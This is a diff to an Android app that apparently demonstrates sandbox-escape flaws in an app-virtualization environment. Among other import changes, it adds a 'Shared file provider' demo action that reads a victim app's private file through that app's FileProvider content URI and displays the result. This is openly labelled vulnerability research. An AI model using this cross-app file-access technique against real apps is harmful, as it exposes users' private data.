@@ -7,18 +7,13 @@ import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
 import androidx.compose.foundation.ExperimentalFoundationApi
-import androidx.compose.foundation.layout.fillMaxSize
-import androidx.compose.foundation.layout.padding
-import androidx.compose.material3.Scaffold
-import androidx.compose.material3.Text
-import androidx.compose.runtime.Composable
-import androidx.compose.ui.Modifier
-import com.virtualxposed.guestattacker.ui.theme.AttacksTheme
 import androidx.compose.foundation.layout.Arrangement
 import androidx.compose.foundation.layout.Column
 import androidx.compose.foundation.layout.PaddingValues
 import androidx.compose.foundation.layout.Row
+import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.foundation.layout.fillMaxWidth
+import androidx.compose.foundation.layout.padding
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.items
 import androidx.compose.material3.Button
@@ -26,15 +21,23 @@ import androidx.compose.material3.Card
 import androidx.compose.material3.CardDefaults
 import androidx.compose.material3.ExperimentalMaterial3Api
 import androidx.compose.material3.MaterialTheme
+import androidx.compose.material3.Scaffold
 import androidx.compose.material3.Surface
+import androidx.compose.material3.Text
 import androidx.compose.material3.TopAppBar
+import androidx.compose.runtime.Composable
 import androidx.compose.runtime.remember
 import androidx.compose.ui.Alignment
+import androidx.compose.ui.Modifier
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
+import androidx.core.net.toUri
 import com.virtualxposed.guestattacker.StorageBypass.HOST_APP
+import com.virtualxposed.guestattacker.StorageBypass.VICTIM_APP
 import com.virtualxposed.guestattacker.StorageBypass.victimFile
+import com.virtualxposed.guestattacker.Utils.log
 import com.virtualxposed.guestattacker.Utils.toast
+import com.virtualxposed.guestattacker.ui.theme.AttacksTheme
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -46,7 +49,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    @SuppressLint("SdCardPath")
+    @SuppressLint("SdCardPath", "QueryPermissionsNeeded")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -110,7 +113,27 @@ class MainActivity : ComponentActivity() {
                                 "Private file results: $result",
                             )
                         },
-                        // TODO Find context abuse
+
+                        DemoAction("Shared file provider", "This app shares the same underlying context as the victim app. Therefore this app can use the private file providers from the victim app.", DemoCategory.SharedContext) {
+                            val uri =
+                                "content://${VICTIM_APP}.fileprovider/private_files/private-file".toUri()
+
+                            val result = runCatching {
+                                contentResolver.openInputStream(uri)?.reader()?.readText()
+                            }.getOrNull()
+
+                            if (result == null) {
+                                toast(
+                                    this,
+                                    "Unable to read from the file provider",
+                                )
+                            } else {
+                                toast(
+                                    this,
+                                    "Private file results: $result",
+                                )
+                            }
+                        }
                     )
                 )
             }
@@ -123,7 +146,8 @@ enum class DemoCategory(val categoryName: String) {
     IO("Improper storage isolation"),
     MissingHook("Missing hook abuse"),
     Interference("Cross-app interference"),
-    SharedProcess("Shared process vulnerabilities")
+    SharedProcess("Shared process vulnerabilities"),
+    SharedContext("Shared context vulnerabilities"),
 }
 
 data class DemoAction(
